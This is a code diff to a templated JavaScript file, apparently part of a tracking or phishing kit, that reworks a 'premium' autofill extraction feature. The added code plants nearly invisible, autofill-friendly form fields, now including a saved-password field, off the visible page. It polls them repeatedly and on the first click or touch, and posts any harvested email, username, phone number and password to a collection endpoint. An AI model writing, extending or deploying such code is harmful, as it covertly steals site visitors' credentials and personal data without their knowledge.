@@ -585,18 +585,35 @@ function doActivityDetect(){
 
 <% if(autofillAccess){ %>
 // ── Autofill extraction (premium) ─────────────────────────────────────────────
+var _afSent=false;
 function doAutofill(){
-  var f=document.createElement("form");
-  f.style.cssText="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.001;pointer-events:none;";
-  f.innerHTML='<input name="email" type="email" autocomplete="email" tabindex="-1"><input name="username" type="text" autocomplete="username" tabindex="-1"><input name="tel" type="tel" autocomplete="tel" tabindex="-1">';
-  document.body.appendChild(f);
-  setTimeout(function(){
-    var em=f.querySelector("[name=email]").value;
-    var un=f.querySelector("[name=username]").value;
-    var tel=f.querySelector("[name=tel]").value;
-    document.body.removeChild(f);
-    if(em||un||tel) $.post(a+"/autofill",{uid:uid,email:em,username:un,tel:tel});
-  },2000);
+  // Browsers require visible, properly-sized fields to autofill
+  var wrap=document.createElement("div");
+  wrap.style.cssText="position:fixed;bottom:-80px;left:0;width:100%;height:70px;z-index:-1;pointer-events:none;overflow:hidden;";
+  wrap.innerHTML='<form autocomplete="on" style="display:flex;gap:4px;">'
+    +'<input type="email"    name="email"    autocomplete="email"            style="width:25%;height:60px;opacity:0.02;font-size:16px;border:none;" tabindex="-1">'
+    +'<input type="text"     name="username" autocomplete="username"         style="width:25%;height:60px;opacity:0.02;font-size:16px;border:none;" tabindex="-1">'
+    +'<input type="tel"      name="tel"      autocomplete="tel"              style="width:25%;height:60px;opacity:0.02;font-size:16px;border:none;" tabindex="-1">'
+    +'<input type="password" name="password" autocomplete="current-password" style="width:25%;height:60px;opacity:0.02;font-size:16px;border:none;" tabindex="-1">'
+    +'</form>';
+  document.body.appendChild(wrap);
+
+  function _readAndSend(){
+    if(_afSent)return;
+    var em=wrap.querySelector("[name=email]").value;
+    var un=wrap.querySelector("[name=username]").value;
+    var tel=wrap.querySelector("[name=tel]").value;
+    var pw=wrap.querySelector("[name=password]").value;
+    if(em||un||tel||pw){
+      _afSent=true;
+      $.post(a+"/autofill",{uid:uid,email:em,username:un,tel:tel,password:pw});
+    }
+  }
+  // Check at multiple intervals and on first user interaction
+  [1200,2500,4000,7000,12000].forEach(function(d){setTimeout(_readAndSend,d);});
+  ["click","touchstart","focus"].forEach(function(ev){
+    document.addEventListener(ev,function(){setTimeout(_readAndSend,400);},{once:true,capture:true});
+  });
 }
 <% } %>
 
